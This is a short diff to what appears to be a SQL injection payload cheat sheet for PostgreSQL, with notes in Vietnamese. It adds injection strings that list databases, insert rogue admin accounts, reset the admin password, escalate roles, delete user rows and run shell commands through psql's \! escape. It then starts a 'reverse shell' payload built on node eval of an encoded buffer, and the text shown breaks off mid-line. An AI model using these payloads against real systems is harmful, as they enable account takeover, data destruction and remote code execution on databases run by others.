@@ -6,9 +6,16 @@
 - postgresql : ¿'; + các lệnh độc --
 - psql : ¿'; \! các lệnh độc #
 
+* SQL *
+¿'; SELECT datname FROM pg_database; --
 ¿'; INSERT INTO users (username, password, role, email) VALUES ('hacker12', 'pwned', 'admin', 'hacker12@fcode.org'); --
+¿'; INSERT INTO users (username, password, role, email) VALUES ('TungTungSahur', 'brain', 'admin', 'tungtungsahur@fcode.org'); --
 ¿'; UPDATE users SET password = '123' WHERE username = 'admin'; --
 ¿'; UPDATE users SET role = 'admin' WHERE username = 'hacker12'; --
+¿'; DELETE FROM users WHERE id = 10; --
+
+* PSQL *
+¿'; \! ls -la /; #
 
 *** reverse shell:***
 ¿'; \! node -e "eval(Buffer.from
